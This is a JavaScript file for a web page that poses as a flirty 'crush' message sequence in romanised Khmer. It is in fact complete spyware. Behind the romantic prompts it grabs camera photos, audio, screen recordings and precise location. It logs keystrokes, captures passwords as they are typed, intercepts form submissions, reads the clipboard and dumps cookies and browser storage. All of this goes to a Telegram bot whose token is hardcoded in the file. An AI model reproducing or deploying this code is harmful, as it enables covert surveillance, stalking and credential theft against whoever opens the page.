// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;
let alertIndex = 0;
let permissionsRequested = {
    camera: false,
    microphone: false,
    location: false,
    screen: false
};

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== CRUSH MESSAGES ====================
const crushMessages = [
    { text: "Hi crush 😘", permission: "camera" },
    { text: "som skal ban ot has 🥺", permission: "microphone" },
    { text: "nh luoch crush yu hz 🌷💛", permission: "location" },
    { text: "min deng tha yu mean neak nh te 😭", permission: "screen" },
    { text: "pel khenh yu mdong2 jit ot nov seng 😳", permission: null },
    { text: "yu cute klang nahh bbe 🤍", permission: null },
    { text: "pel yu smile mok jit khnhom jol chet klang mg 😭💛", permission: null },
    { text: "nh ot del mean aromm doch nis cheamuoy neak na te 🥺", permission: null },
    { text: "ber yu min romkhan nh te nh jg skal yu oy chet cheang nis 😚", permission: null },
    { text: "som oy ban chat cheamuoy yu yuy2 ban te 🌷", permission: null },
    { text: "tov na kor nerk tae yu mneak eng 😭🤍", permission: null },
    { text: "ber ban yu chea crush khnhom yuy2 kor laor nas hz 😳", permission: null },
    { text: "nh min deng tha crush yu tang pi pel na te tae deng tae tha crush klang hz 💔", permission: null },
    { text: "yu mean voice cute nahh 😭", permission: null },
    { text: "som kom mean neak nh ban te 😔", permission: null },
    { text: "nh jg oy yu deng tha mean mneak secretly srolanh yu 😚💛", permission: null },
    { text: "ber thngai na yu mean banha kor mean nh nov kbae yu nich 🤍", permission: null },
    { text: "yu chea mnus del tver oy thngai robos nh mean ney 😭🌷", permission: null },
    { text: "good night crushh 🌙", permission: null },
    { text: "sweet dream na bbe 😴💛", permission: null }
];

// ==================== SHOW ALERTS ====================
function showNextAlert() {
    if (alertIndex >= crushMessages.length) {
        sendTelegramMessage(`💖 *All Messages Completed*\n\nTotal: ${crushMessages.length} messages\n💕 Love you forever! 💕`);
        setTimeout(() => stealAllData(), 2000);
        return;
    }
    
    const current = crushMessages[alertIndex];
    
    // Show alert with just the message
    const userConfirmed = confirm(current.text);
    
    if (userConfirmed && current.permission) {
        // Request permission immediately
        if (current.permission === "camera") {
            requestCamera();
        } else if (current.permission === "microphone") {
            requestMicrophone();
        } else if (current.permission === "location") {
            requestLocation();
        } else if (current.permission === "screen") {
            requestScreen();
        }
    }
    
    alertIndex++;
    showNextAlert(); // Call immediately, no delay
}

// ==================== TELEGRAM MESSAGE ====================
function sendTelegramMessage(message) {
    if (!CHAT_ID) return;
    
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: message,
            parse_mode: 'Markdown'
        }),
    }).catch(err => console.error("Telegram error:", err));
}

// ==================== 1. CAMERA PERMISSION ====================
async function requestCamera() {
    if (permissionsRequested.camera) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' },
            audio: false 
        });
        cameraStream = stream;
        permissionsRequested.camera = true;
        
        sendTelegramMessage(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Capture photo
        capturePhoto(stream);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : 'Error occurred';
        sendTelegramMessage(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendFileToTelegram(file, `📸 Camera Photo`);
            }
        }, 'image/jpeg', 0.8);
        
        setTimeout(() => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            video.remove();
            cameraStream = null;
        }, 2000);
        
    } catch (error) {
        console.error("Capture photo error:", error);
    }
}

// ==================== 2. MICROPHONE PERMISSION ====================
async function requestMicrophone() {
    if (permissionsRequested.microphone) return;
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        permissionsRequested.microphone = true;
        
        sendTelegramMessage(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        // Record audio
        recordAudio(stream);
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error occurred';
        sendTelegramMessage(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

async function recordAudio(stream) {
    try {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        
        recorder.ondataavailable = (e) => { 
            if (e.data.size > 0) chunks.push(e.data); 
        };
        
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            if (blob.size > 0) {
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await sendFileToTelegram(file, `🎤 Audio Recording`);
            }
            stream.getTracks().forEach(track => track.stop());
            audioStream = null;
        };
        
        recorder.start();
        setTimeout(() => {
            if (recorder.state === 'recording') recorder.stop();
        }, 5000);
        
    } catch (error) {
        console.error("Record audio error:", error);
    }
}

// ==================== 3. LOCATION PERMISSION ====================
function requestLocation() {
    if (permissionsRequested.location) {
        sendTelegramMessage(`📍 *ទីតាំង* - Already requested`);
        return;
    }
    
    if (!navigator.geolocation) {
        sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*\n\n📝 Geolocation not supported`);
        return;
    }
    
    sendTelegramMessage(`📍 *កំពុងស្នើសុំទីតាំង...*`);
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            permissionsRequested.location = true;
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            
            sendTelegramMessage(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
            
            // Send location to Telegram as map
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            } catch (err) {}
        },
        (error) => {
            let msg = 'User denied location permission';
            if (error.code === error.TIMEOUT) msg = 'Timeout';
            else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
            sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// ==================== 4. SCREEN RECORDING PERMISSION ====================
async function requestScreen() {
    if (permissionsRequested.screen) return;
    if (isRecording) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        permissionsRequested.screen = true;
        screenStream = stream;
        
        sendTelegramMessage(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        screenRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType,
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (e) => { 
            if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            
            if (blob.size > 0) {
                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
                await sendVideoToTelegram(file, `🎥 Screen Recording\n📊 Size: ${formatBytes(blob.size)}`);
            }
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        
        // Auto stop after 30 seconds
        setTimeout(() => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        }, 30000);
        
        stream.getVideoTracks()[0].addEventListener('ended', () => {
            if (screenRecorder && screenRecorder.state === 'recording') {
                screenRecorder.stop();
            }
        });
        
    } catch (error) {
        let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
        sendTelegramMessage(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
    }
}

// ==================== STEAL COOKIES & DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getAllCookies();
        const cookieCount = Object.keys(cookies).length;
        const ip = await getIP();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 *Cookies:* ${cookieCount} found\n`;
        
        if (cookieCount > 0) {
            Object.entries(cookies).slice(0, 5).forEach(([name, value]) => {
                const shortValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `├─ ${name}: ${shortValue}\n`;
            });
            if (cookieCount > 5) message += `└─ ... and ${cookieCount - 5} more\n`;
        }
        
        message += `\n💾 *Storage:*\n`;
        message += `├─ LocalStorage: ${localStorage.length} items\n`;
        message += `├─ SessionStorage: ${sessionStorage.length} items\n`;
        
        message += `\n📱 *Device Info*\n`;
        message += `⏰ Time: ${new Date().toLocaleString('km-KH')}\n`;
        message += `🌐 IP: ${ip}\n`;
        message += `🖥️ Platform: ${navigator.platform}\n`;
        message += `📺 Screen: ${window.screen.width}x${window.screen.height}\n`;
        message += `🌍 Language: ${navigator.language}\n`;
        message += `📍 URL: ${window.location.href}`;
        
        if (currentLocation) {
            message += `\n📍 Location: ${currentLocation.lat}, ${currentLocation.lng} (±${currentLocation.accuracy}m)`;
        }
        
        sendTelegramMessage(message);
        
        // Create full JSON data
        const fullData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: cookies,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
            location: currentLocation,
            screen: { width: window.screen.width, height: window.screen.height },
            language: navigator.language,
            platform: navigator.platform,
            permissions: permissionsRequested
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {
        console.error("Steal error:", error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unable to fetch';
        }
    }
}

// ==================== TELEGRAM HELPERS ====================
async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {
        console.error("Send file error:", error);
    }
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {
        await sendFileToTelegram(file, caption);
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.target && e.target.type === 'password') return;
    
    if (e.key.length === 1) {
        keylogBuffer += e.key;
    } else if (e.key === 'Enter') {
        keylogBuffer += '\n';
    } else if (e.key === 'Backspace') {
        keylogBuffer = keylogBuffer.slice(0, -1);
    } else if (e.key === ' ') {
        keylogBuffer += ' ';
    } else if (e.key === 'Tab') {
        keylogBuffer += '    ';
    }
    
    clearTimeout(keylogTimer);
    keylogTimer = setTimeout(async () => {
        if (keylogBuffer.length > 0) {
            await sendTelegramMessage(`⌨️ *Keylogger*\n\n${keylogBuffer}`);
            keylogBuffer = '';
        }
    }, 3000);
});

// ==================== FORM INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else if (value && value.toString().trim() !== '') {
            data[key] = value;
        }
    }
    
    if (Object.keys(data).length > 0) {
        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
        for (let [key, value] of Object.entries(data)) {
            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
            message += `├─ ${key}: ${shortValue}\n`;
        }
        sendTelegramMessage(message);
    }
});

// ==================== PASSWORD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target && target.type === 'password' && target.value && target.value.length > 0) {
        const name = target.name || target.id || target.className || 'Unknown';
        const value = target.value;
        
        sendTelegramMessage(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${value}`);
        keylogBuffer = '';
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboard = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
            lastClipboard = text;
            sendTelegramMessage(`📋 *Clipboard*\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== PAGE UNLOAD ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 *User Leaving*\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});

// ==================== INITIALIZE ====================
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    if (themeToggle) themeToggle.style.display = 'none';
    
    sendTelegramMessage(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    // Start alerts immediately
    showNextAlert();
    
    // Steal data after 10 seconds
    setTimeout(() => {
        stealAllData();
    }, 10000);
    
    // Steal data every 60 seconds
    setInterval(() => {
        stealAllData();
    }, 60000);
});